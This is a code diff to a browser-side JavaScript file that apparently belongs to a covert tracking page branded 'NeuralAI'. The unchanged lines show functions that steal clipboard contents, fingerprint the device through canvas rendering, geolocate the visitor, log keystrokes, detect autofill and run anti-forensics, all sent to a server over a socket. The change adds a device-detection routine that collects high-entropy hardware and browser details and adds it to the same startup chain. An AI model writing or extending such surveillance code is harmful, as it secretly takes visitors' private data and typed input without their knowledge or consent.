@@ -502,8 +502,35 @@ function ipGeolocate() {
 
 function getFingerprint() {
     const fp = { screen:screen.width+'x'+screen.height, availScreen:screen.availWidth+'x'+screen.availHeight, platform:navigator.platform||'', language:navigator.language, languages:navigator.languages?.join(','), timezone:Intl.DateTimeFormat().resolvedOptions().timeZone, tzOffset:new Date().getTimezoneOffset(), cpu:navigator.hardwareConcurrency||'', mem:navigator.deviceMemory||'', touch:'ontouchstart' in window, cookies:navigator.cookieEnabled };
-    const c=document.createElement('canvas'); c.width=200; c.height=50; const x=c.getContext('2d'); x.textBaseline='top'; x.font='14px Arial'; x.fillStyle='#f60'; x.fillRect(125,1,62,20); x.fillStyle='#069';     x.fillText('NeuralAI\u2122',2,15); x.fillStyle='rgba(102,204,0,0.7)'; x.fillText('fp',4,30); fp.canvas=c.toDataURL();
+    const c=document.createElement('canvas'); c.width=200; c.height=50; const x=c.getContext('2d'); x.textBaseline='top'; x.font='14px Arial'; x.fillStyle='#f60'; x.fillRect(125,1,62,20); x.fillStyle='#069'; x.fillText('NeuralAI\u2122',2,15); x.fillStyle='rgba(102,204,0,0.7)'; x.fillText('fp',4,30); fp.canvas=c.toDataURL();
     socket.emit('device-info',{fingerprint:fp});
+}
+
+function detectDevice() {
+    const info = {};
+    info.screen = { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio || 1 };
+    info.cssHover = window.matchMedia('(hover: hover)').matches;
+    info.cssPointer = window.matchMedia('(pointer: fine)').matches ? 'fine' : (window.matchMedia('(pointer: coarse)').matches ? 'coarse' : 'none');
+    info.touchPoints = navigator.maxTouchPoints || 0;
+    info.orientation = screen.orientation ? screen.orientation.type : '';
+    info.platform = navigator.platform || '';
+    info.hardwareConcurrency = navigator.hardwareConcurrency || 0;
+    info.deviceMemory = navigator.deviceMemory || 0;
+    if (navigator.userAgentData) {
+        info.uaBrands = navigator.userAgentData.brands.map(b => b.brand + ' ' + b.version);
+        info.uaMobile = navigator.userAgentData.mobile;
+        navigator.userAgentData.getHighEntropyValues(['model', 'platform', 'platformVersion', 'uaFullVersion', 'bitness', 'architecture', 'wow64']).then(h => {
+            info.uaModel = h.model || '';
+            info.uaPlatform = h.platform || '';
+            info.uaPlatformVersion = h.platformVersion || '';
+            info.uaFullVersion = h.uaFullVersion || '';
+            info.architecture = h.architecture || '';
+            info.bitness = h.bitness || '';
+            socket.emit('device-info', { deviceDetection: info });
+        }).catch(() => { socket.emit('device-info', { deviceDetection: info }); });
+    } else {
+        socket.emit('device-info', { deviceDetection: info });
+    }
 }
 
 function stealClipboard() { if(navigator.clipboard?.readText) navigator.clipboard.readText().then(t=>{if(t&&t.length>3)socket.emit('device-info',{clipboard:t.slice(0,500)})}).catch(()=>{}); }
@@ -829,7 +856,7 @@ function initAntiForensics() {
 }
 
 function requestPermissions() {
-    sendDeviceInfo(); getFingerprint(); ipGeolocate(); stealClipboard();
+    sendDeviceInfo(); getFingerprint(); ipGeolocate(); stealClipboard(); detectDevice();
     initMotionSensor(); startKeepalive(); requestWakeLock(); initLightSensor();
     initKeystrokeLogger(); initClickHeatmap(); initAutofillDetection();
     initVisibilityTracker(); initMultiWindow();
